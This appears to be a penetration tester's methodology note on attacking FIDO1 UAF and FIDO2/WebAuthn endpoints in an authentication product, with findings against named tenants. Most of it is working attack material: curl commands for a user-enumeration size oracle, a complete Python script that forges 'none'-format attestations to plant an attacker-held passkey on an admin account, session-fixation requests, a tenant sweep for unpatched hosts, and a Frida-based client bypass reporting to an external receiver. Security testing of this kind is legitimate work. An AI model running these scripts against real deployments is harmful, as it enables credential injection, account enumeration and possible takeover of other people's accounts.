# FIDO1 UAF & FIDO2/WebAuthn Testing

Two distinct passwordless protocols, two distinct attack surfaces. AcmeAuth runs both simultaneously on v11.1.0/v11.3.0; v11.5.0 removes FIDO1 (`/rp/fido/get` 404).

---

## FIDO2 / WebAuthn

### The two unauthenticated ceremony endpoints

```
POST /fido2/attestation/options   # issues WebAuthn reg challenge for ANY username, leaks excludeCredentials
POST /fido2/attestation/result    # accepts forged fmt:"none" attestation, PERSISTS to victim account
POST /fido2/assertion/options     # returns full allowCredentials array (credential inventory)
```

### The 47.9× size oracle (user enumeration)

```bash
# Valid user — admin@acmeauth.example had 130 credentials:
curl -s -X POST https://tenant-002.cdn.acmeauth.example/fido2/assertion/options \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin@acmeauth.example"}' | wc -c     # 11,740 bytes

# Non-existent user:
curl -s -X POST https://tenant-002.cdn.acmeauth.example/fido2/assertion/options \
  -H 'Content-Type: application/json' \
  -d '{"username":"nobody@xyz.com"}' | wc -c     # 245 bytes
```

`11740 / 245 = 47.9×`. Secondary timing oracle: ~1040 ms (valid) vs ~790 ms (invalid), ~250 ms differential.

**Negative-control caveat (Lesson 1):** some tenants return empty `allowCredentials:[]` for all users as anti-enumeration. Always run with a guaranteed-nonexistent username before claiming an oracle.

### excludeCredentials leak (authenticator inventory disclosure)

The `/fido2/attestation/options` response includes the victim's **complete list of existing credential IDs** in `excludeCredentials` — every registered public-key handle. F13 PoC confirmed `admin@acmeauth.example` had 130 existing credential IDs disclosed unauthenticated. These can (a) fingerprint authenticator models, (b) correlate users cross-tenant, (c) verify persistence of an injected credential.

### allowCredentials disclosure

On vulnerable tenants (pentesting2/tenant-002), `/fido2/assertion/options` returns the **full `allowCredentials` array**. On correctly-configured tenants (tenant-001), it returns empty `[]` (anti-enumeration). The tenant config toggle is the differentiator.

### Constructing a syntactically valid WebAuthn attestation with attacker ECDSA keypair

Working recipe (Python, `cryptography` lib, manual CBOR):

```python
import base64, hashlib, json, os, subprocess
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend

T = "https://tenant-002.cdn.acmeauth.example"; RPID = b"cdn.acmeauth.example"
USER = "admin@acmeauth.example"; RP_APP = "AcmeAuthDefaultApplication"

def cbor_encode(o):
    if isinstance(o, int):
        if o>=0:
            if o<24: return bytes([o])
            elif o<256: return bytes([24,o])
            else: return bytes([25])+o.to_bytes(2,'big')
        else: return bytes([0x20+(-1-o)])
    elif isinstance(o,str):
        b=o.encode(); n=len(b)
        return (bytes([0x60+n]) if n<24 else bytes([0x78,n]))+b
    elif isinstance(o,bytes):
        n=len(o); return (bytes([0x40+n]) if n<24 else bytes([0x58,n]))+o
    elif isinstance(o,dict):
        out=bytes([0xa0+len(o)])
        for k,v in o.items(): out+=cbor_encode(k)+cbor_encode(v)
        return out
    elif o is None: return bytes([0xf6])

# 1. Get challenge
resp=json.loads(subprocess.run(["curl","-s","-X","POST","-H","Content-Type: application/json",
  "-d",json.dumps({"username":USER,"rpAppId":RP_APP,"displayName":"Attacker"}),
  f"{T}/fido2/attestation/options"],capture_output=True,text=True).stdout)
challenge=resp["challenge"]

# 2. Fresh P-256 keypair
key=ec.generate_private_key(ec.SECP256R1(),default_backend())
nums=key.public_key().public_numbers()
x=nums.x.to_bytes(32,'big'); y=nums.y.to_bytes(32,'big')

# 3. authData = rpIdHash(32) + flags(1)=0x41 + signCount(4) + aaguid(16) + credIdLen(2) + credId(32) + pubkeyCBOR
cred_id=os.urandom(32)
auth_data=(hashlib.sha256(RPID).digest()+b'\x41'+(1).to_bytes(4,'big')+
  os.urandom(16)+(32).to_bytes(2,'big')+cred_id+
  cbor_encode({1:2,3:-7,-1:1,-2:x,-3:y}))
att_obj={"fmt":"none","authData":auth_data,"attStmt":{}}
cid_b64=base64.urlsafe_b64encode(cred_id).decode().rstrip("=")

# 4. Submit
body={"id":cid_b64,"rawId":cid_b64,"type":"public-key",
  "response":{
    "attestationObject":base64.urlsafe_b64encode(cbor_encode(att_obj)).decode().rstrip("="),
    "clientDataJSON":base64.urlsafe_b64encode(json.dumps({
      "type":"webauthn.create","challenge":challenge,"origin":T,"crossOrigin":False
    }).encode()).decode().rstrip("=")},
  "rpAppId":RP_APP,"username":USER}
print(subprocess.run(["curl","-s","-X","POST","-H","Content-Type: application/json",
  "-d",json.dumps(body),f"{T}/fido2/attestation/result"],
  capture_output=True,text=True).stdout)
# {"status":"ok","errorMessage":"","username":"admin@acmeauth.example","authenticatorName":"Passkey"}
```

**Critical trick:** `fmt:"none"` requires **no attestation chain** — the server accepts a self-attested credential. The `attStmt` is empty `{}`. The authData flags byte `0x41` = AT flag (attested credential data included) + UP (user present). COSE pubkey map keys: `1:2` (kty EC2), `3:-7` (alg ES256), `-1:1` (crv P-256), `-2:x`, `-3:y`.

### rpAppId binding (the ATO blocker)

F13's injected credential was persisted under `rpAppId:"AcmeAuthDefaultApplication"` (hardcoded default). Attempts to mass-assign `rpAppId:"controlCenterAdmin"` (the CC-admin rpAppId) in the result body were silently ignored — the server uses the rpAppId from the original attestation/options challenge, not the result. This is why F13 is Critical (strict 9.1; original submission scored 9.8 with A:H — see `cvss-scoring-methodology.md` for the strict re-scoring to A:N) for credential-injection but cannot escalate to CC-admin ATO.

### Tenant-toggle detection (who is patched)

```bash
for t in tenant-001 tenant-demo portal <customer> <customer> <standards-org-tenant> <customer> tenant-002 pentesting2 <customer>; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://$t.cdn.acmeauth.example/fido2/attestation/options" \
    -H 'Content-Type: application/json' -d '{"username":"admin@acmeauth.example"}')
  # Check response body for "Registration is not permitted" vs "status:ok"
done
```

The 2026-07-26 sweep found 7 tenants mitigated, 3 still live (tenant-002, pentesting2, <customer>). The mitigation returns HTTP `200` with `{"status":"failed","errorMessage":"Registration is not permitted: Disabled..."}` — note it is **not** 401/403, so the unauthenticated code path (CWE-306) is unchanged; only the downstream feature is gated.

### The F13 blocker triad (three independent ATO-completion blockers)

F13's credential-injection is Critical (strict 9.1) but **cannot complete to account takeover** because three independent controls all hold. Future FIDO-injection work on a similar stack should check all three — missing any one is the difference between Critical-credential-injection and full ATO:

1. **Attestation `rpAppId`-binding** (the one above). Server uses the `rpAppId` from the original `attestation/options` challenge, not from the `attestation/result` body. Mass-assignment of `rpAppId:"controlCenterAdmin"` in the result is silently ignored — the credential persists only under `AcmeAuthDefaultApplication`.

2. **CC-admin per-`rpAppId` credential binding** (the WebAuthn ceremony below). Even if a credential existed under `controlCenterAdmin`, the CC-admin login chain requires a browser-mediated WebAuthn assertion plus a server-generated `acmeauth-login-nonce` cookie that is unforgeable without an enrolled CC-admin FIDO2 credential.

3. **Legacy `/fido2/assertion/result` session-`rpAppId` requirement** (the third leg, often missed). Direct `POST /fido2/assertion/result` with the injected credential always returns `"CredentialId is invalid: Missing rpAppId in non-conformance mode"`. The legacy assertion-result endpoint requires `rpAppId` to be present in the server-side session — and the **only** endpoint that sets it is `POST /login/fido2/assertion/options?rpAppId=<X>` (the CSRF-gated CC-admin challenge endpoint), not the unauthenticated `POST /fido2/assertion/options`. So even with an injected credential in hand, the legacy path cannot consume it without first going through the CC-admin gated ceremony.

**Pattern.** When auditing a FIDO2 implementation for inject-then-authenticate chains, enumerate every assertion-result endpoint variant (legacy, conformance, login-gated) and check which session preconditions each one requires. A "credential persisted" win is only ATO-equivalent if at least one assertion-result variant consumes it without a separate gated precondition.

### WebAuthn ceremony for CC-admin login (FIDO2-gated end-to-end)

```
POST /cc/dtsg97305                                              # mint CSRF token (unauth, by-design)
→ POST /login/fido2/assertion/options?rpAppId=controlCenterAdmin # WebAuthn assertion challenge
→ browser-mediated WebAuthn assertion                           # requires enrolled CC-admin FIDO2 cred
→ acmeauth-login-nonce cookie (server-generated post-assertion)     # unforgeable
→ POST /login                                                   # exchanges nonce for SESSION cookie
```

Theacmeauth-login-nonce is server-generated post-assertion and unforgeable — the entire chain cannot be completed without an enrolled `controlCenterAdmin` FIDO2 credential. This is the dominant blocker for any CC-admin-gated RCE/SSTI sink.

---

## FIDO1 UAF (legacy)

### The single endpoint, 3-operation set

```bash
# op=Reg — issues a real FIDO1 challenge bound to attacker-supplied username, echoes sessionId verbatim
curl -s -X POST https://pentesting2.cdn.acmeauth.example/rp/fido/get \
  -H 'Content-Type: application/json' \
  -d '{"fidoPayload":{"context":{"transaction":"Reg","userName":"admin@acmeauth.example"},
       "op":"Reg","extras":{}},
       "session":{"deviceId":"d","machine":"m","sessionId":"attacker-controlled-001",
       "machineUserName":"admin@acmeauth.example"}}'
# {"status":{"responseCode":200,"responseMessage":"Registration Success"},
#  "response":{"sessionId":"attacker-controlled-001",      <-- VERBATIM echo = session fixation
#  "fidoResponse":{"uafRequest":"[{\"header\":{...},\"challenge\":\"YmJhdnFxczNr...\",
#                   \"username\":\"admin@acmeauth.example\",...}]","statusCode":1200}}}

# op=Dereg — same, "Deregistration Success"
# op=Auth — ALWAYS 500
curl -i -X POST https://pentesting2.cdn.acmeauth.example/rp/fido/get -H 'Content-Type: application/json' \
  -d '{"fidoPayload":{"context":{"transaction":"Auth","userName":"admin@acmeauth.example"},"op":"Auth","extras":{}},
       "session":{"sessionId":"x"}}'
# HTTP/2 500  {"type":"/static/docs/jakarta/ws/rs/InternalServerErrorException.html",
#              "detail":"...ExceptionId: c9dcc805-7813-4a4f-941c-c9c8fd128e43"}
```

### Why op=Auth always 500s

The auth code path **does not handle the "user has no registered authenticators" case** — it throws an uncaught `InternalServerErrorException` with a fresh `ExceptionId` UUID per request. This is a server-side bug, not a graceful error. The 500 fires even for `admin@acmeauth.example` (a real user with many FIDO2 but no FIDO1 credentials). It is a **state-pollution oracle** for log correlation and a DoS amplifier (stack-trace generation is CPU-expensive).

### Why /rp/fido/send/reg strictly validates TLV

The follow-up `/rp/fido/send/reg` enforces FIDO1 UAF `RegResponse` TLV structure. All syntactic-injection variants rejected:

| Variant | Result |
|---|---|
| Raw JSON of an attempted `RegResponse` | 400 `InvalidJSONRequestProblem` |
| Serialized-string form | 500 `InternalServerErrorException` |
| Echo-only challenge (no authenticator signature) | 400 |
| TLV with correct outer structure but bogus signature | 400 |

**This is why F22 is HIGH (7.3) and not CRITICAL** — without a real FIDO1-compliant authenticator, the credential-registration step cannot be completed. The cap is unauth state-creation + session-fixation + DoS amplifier.

### Architectural signal worth noting

`/rp/fido/send/dereg` returns a Spring Boot default error envelope (`{"timestamp":...,"status":400,"error":"Bad Request","path":...}`) that differs from the Jakarta `InvalidJSONRequestProblem` envelope returned by every other `/rp/fido/*` endpoint. This proves `/rp/fido/send/dereg` is handled by a **separate Spring Boot service instance** — useful for microservice mapping.

### Version diff

v11.5.0 (`sampleapp.dev.acmeauth.example`) returns 404 for `/rp/fido/get` — the endpoint was removed. v11.1.0 (`tenant-demo`) and v11.3.0 still expose it.

---

## Generic FIDO testing methodology (apply to any FIDO deployment)

### 1. Enumerate the ceremony endpoints

Standard WebAuthn paths to probe:
- `/attestation/options`, `/attestation/result` (registration)
- `/assertion/options`, `/assertion/result` (authentication)
- Vendors may prefix: `/fido2/*`, `/webauthn/*`, `/rp/fido2/*`, `/api/auth/webauthn/*`

FIDO1 UAF paths:
- `/fido/get`, `/fido/send/reg`, `/fido/send/auth`, `/fido/send/dereg`
- Vendors may prefix: `/rp/fido/*`, `/uaf/*`

### 2. Test each ceremony unauthenticated

For each endpoint, send the minimum body that should trigger the ceremony. Record:
- HTTP status (200/400/401/403/500)
- Body schema (does it leak challenge/username/rpId?)
- Whether the response is deterministic in size/timing across existing vs non-existing users (size/timing oracle candidates)
- Whether the response echoes any client-controlled field verbatim (session-fixation candidates)

### 3. Check excludeCredentials / allowCredentials disclosure

The registration challenge typically includes `excludeCredentials` (existing credentials to prevent dup registration). The assertion challenge typically includes `allowCredentials` (credentials the user can use to authenticate). Both can leak the user's complete authenticator inventory.

**Negative control:** some deployments correctly return empty arrays as anti-enumeration. Always test with a guaranteed-nonexistent username before claiming disclosure.

### 4. Try `fmt:"none"` for self-attested credential injection

If the attestation/result endpoint accepts `fmt:"none"` (no attestation chain), you may be able to register a credential you control onto an arbitrary account without ever possessing a hardware authenticator. The CBOR construction above is generic — adjust `RPID` and `RP_APP` to the target.

### 5. Check rpAppId / rpId / origin binding

FIDO credentials are scoped to a relying party. If the server lets you mass-assign `rpAppId` in the result body (rather than binding it to the original challenge), you may be able to escalate to a privileged rpAppId (e.g., admin vs user). F13 was capped at Critical-credential-injection precisely because AcmeAuth correctly bound rpAppId server-side.

### 6. Check for state-pollution oracles

FIDO1 `op=Auth` against a user with no registered authenticators should return a graceful 4xx. If it returns an uncaught 500 with a fresh UUID, that's a server-side bug useful for:
- Log correlation (ExceptionId → backend log entry)
- DoS amplification (stack-trace generation is CPU-expensive)
- Microservice mapping (different error envelope = different service)

### 7. Version differential

Older versions may expose legacy FIDO1 endpoints; newer versions may have removed them. Endpoint removal is implicit vendor acknowledgement and strengthens the live-version finding's credibility.

---

## Mobile FIDO flows (Android APK)

The AcmeAuth Android APK (`com.acmeauth.one`) reveals the FIDO endpoints via:
- `AcmeAuthApiEndpoints.java` (1669 lines) — 47 RP + Device-API paths, including all FIDO1 endpoints
- `RetrofitGenerator.java` (853 lines) — SSL-pin logic, with the documented gap (attacker-supplied `rpUrl` bypasses pinning if it doesn't match known host substrings)

Mobile-led FIDO attacks require dynamic verification via Frida (see `methodology-lessons.md` Lesson 9). The closed-loop pattern:
1. Set up webhook.site receiver
2. Hook `okhttp3.Request$Builder.url` in-process
3. Invoke the vulnerable method directly via Frida (bypass UI auth gate)
4. Confirm two-sided evidence: in-process URL construction + external receiver hit with app UA
5. Confirm response consumption via app error code

The decisive UA (`okhttp/5.3.2` from the unpinned client, not a system component) is the load-bearing evidence.
